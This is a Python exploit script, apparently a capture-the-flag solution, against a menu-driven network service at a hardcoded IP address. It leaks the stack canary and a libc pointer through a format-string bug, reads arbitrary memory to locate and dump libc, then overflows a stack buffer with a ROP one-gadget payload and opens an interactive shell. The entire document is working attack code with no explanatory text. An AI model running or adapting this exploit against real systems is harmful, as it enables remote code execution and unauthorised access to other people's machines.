import socket, struct, os, binascii, base64
import telnetlib   

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    return res[:-(len(s))]
    
def read_all(sc, n):
    data = ""
    while len(data) < n:
        block = sc.recv(n - len(data))
        if len(block) == 0:
            print repr(data)
            raise Exception("Server disconnected")
        data += block

    return data

def I(n):
    return struct.pack("<I", n)
    
def Q(n):
    return struct.pack("<Q", n)

def read_canary_libc(sc):
    read_until(sc, "3. Exit the battle")
    sc.send("2\n")
    sc.send("|||%23$p|%33$p|||\n")
    read_until(sc, "|||")
    res = read_until(sc, "|||").split("|")

    return int(res[0][2:], 16), int(res[1][2:], 16)
    

def read_memory(sc, address):
    read_until(sc, "3. Exit the battle")
    sc.send("2\n")
    sc.send("|||%8$s|||\x00     " + Q(address))
    read_until(sc, "|||")
    res = read_until(sc, "|||")
    return res


def find_libc_base(sc, libc_seek):
    while True:
        libc_seek = libc_seek & 0xfffffffffffff000
        
        res = read_memory(sc, libc_seek)
        print hex(libc_seek), repr(res)
        if res.startswith("\x7fELF"):
            return libc_seek
        libc_seek -= 0x1000

def dump_libc(sc, libc_base):
    filename = "libcdump.so"
    index = libc_base 
    if os.path.isfile(filename):
        index += os.path.getsize(filename)
        
    while True:
        res = read_memory(sc, index)
        print hex(index), repr(res)
        open(filename, "ab").write(res + "\x00")
        index += len(res) + 1
        
sc = socket.create_connection(("146.185.132.36", 19153))
canary, libc_seek = read_canary_libc(sc)
print hex(canary), hex(libc_seek)

libc_base = libc_seek - (0x7fa0815d1830 - 0x7fa0815b1000)


read_until(sc, "3. Exit the battle")
sc.send("1\n")
sc.send("X" * 0x88 + Q(canary) + Q(0) + Q(libc_base + 0x4526a) + "\x00" * 0x60)

t = telnetlib.Telnet()                                                  
t.sock = sc
t.interact()  

while True:
    data = sc.recv(16384)
    if len(data) == 0:
        break
    for line in data.split("\n"):
        print repr(line)
    